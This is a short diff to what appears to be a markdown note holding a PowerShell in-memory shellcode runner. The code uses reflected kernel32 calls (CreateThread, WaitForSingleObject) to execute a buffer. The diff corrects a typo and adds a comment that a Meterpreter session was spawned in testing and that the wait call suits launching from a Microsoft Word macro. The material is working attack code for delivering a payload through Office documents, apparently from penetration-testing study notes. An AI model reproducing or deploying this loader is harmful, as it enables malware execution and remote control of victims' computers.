@@ -336,7 +336,9 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero,0,[IntPtr]::Zero)
 
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32,dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+# During testing, after setting preparing $hThread variable, the Meterpreter session was spawned automatically if code executed directly in Windows PowerShell ISE. The code below might be needed if this PowerShell code was called let's say from macro of Microsoft Word process.
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 
 ```
 
